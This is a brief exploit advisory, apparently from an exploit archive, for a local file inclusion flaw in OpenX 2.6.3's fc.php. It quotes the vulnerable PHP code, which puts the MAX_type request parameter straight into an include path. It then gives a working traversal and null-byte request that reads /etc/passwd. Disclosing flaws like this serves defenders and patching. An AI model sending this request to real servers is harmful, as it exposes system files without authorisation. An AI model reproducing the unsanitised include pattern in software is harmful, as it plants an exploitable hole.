OpenX 2.6.3 (MAX_type) Local File Inclusion Vulnerability
=========================================================


<snip>
include_once &#039;../../init-delivery.php&#039;;
$MAX_PLUGINS_AD_PLUGIN_NAME = &#039;MAX_type&#039;;
if(!isset($_GET[$MAX_PLUGINS_AD_PLUGIN_NAME])) {
echo $MAX_PLUGINS_AD_PLUGIN_NAME . &#039; is not specified&#039;;
exit(1);
}
$tagName = $_GET[$MAX_PLUGINS_AD_PLUGIN_NAME];
$tagFileName = MAX_PATH . &#039;/plugins/invocationTags/&#039;.$tagName.&#039;/&#039;.$tagName.&#039;.delivery.php&#039;;
if(!file_exists($tagFileName)) {
echo &#039;Invocation plugin delivery file "&#039; . $tagFileName . &#039;" doesn\&#039;t exists&#039;;
exit(1);
}
include $tagFileName;
</snip>

If a null byte is appended to the end of a string, and directory traversal is used in the GET parameter MAX_type, 
like so: /www/delivery/fc.php?MAX_type= ../../../../../../../../../../../../../../../etc/passwd%00, you will see 
the /etc/passwd file before you ;)




